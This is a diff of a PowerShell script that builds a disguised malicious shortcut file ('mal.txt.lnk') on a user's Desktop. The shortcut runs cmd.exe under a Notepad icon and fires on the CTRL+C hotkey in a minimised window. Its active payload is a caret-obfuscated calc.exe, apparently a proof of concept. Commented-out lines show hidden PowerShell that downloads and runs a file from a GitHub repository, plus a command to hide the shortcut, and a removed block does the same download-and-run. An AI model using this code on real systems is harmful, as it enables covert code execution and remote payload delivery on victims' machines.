@@ -1,2 +1,33 @@
-Invoke-WebRequest https://raw.githubusercontent.com/hideinmyskill/patch-tuesday/main/Email-Notification.md -OutFile C:\Users\clark\Desktop\notif.md 
-Start C:\Users\clark\Desktop\notif.md
+#Get the user home directory location & location to place the shortcut file
+$malLoc = $home + “\Desktop\mal.txt.lnk”
+
+#Create WScript.Shell object
+$WshShell = New-Object -comObject WScript.Shell
+
+#LNK file location creation
+$Shortcut = $WshShell.CreateShortcut($malLoc)
+
+#Executing cmd.exe
+$Shortcut.TargetPath = "%windir%\SysWOW64\cmd.exe"
+#$Shortcut.IconLocation = "C:\Users\clark\Downloads\docx.ico"
+$Shortcut.IconLocation = "C:\Windows\system32\notepad.exe"
+#Malicious Command to be executed
+#$Shortcut.Arguments = ‘/c powershell -WindowStyle Hidden Invoke-WebRequest https://raw.githubusercontent.com/hideinmyskill/patch-tuesday/main/Email-Notification.md -OutFile C:\Users\clark\Desktop\notif.md;Start C:\Users\clark\Desktop\notif.md’
+$Shortcut.Arguments = '/c c^a^l^c^.^e^x^e'
+
+
+#Hotkey to trigger the LNK file
+$Shortcut.hotkey = ‘CTRL+C’
+
+#Run the LNK file in minimize window
+$Shortcut.WindowStyle = 7
+
+
+#Save the LNK file
+$Shortcut.Save()
+
+#Hiding the malicious LNK file
+#attrib +h $malLoc
+
+#powershell -WindowStyle Hidden Invoke-WebRequest https://raw.githubusercontent.com/hideinmyskill/patch-tuesday/main/Email-Notification.md -OutFile C:\Users\clark\Desktop\notif.md; Start C:\Users\clark\Desktop\notif.md
+
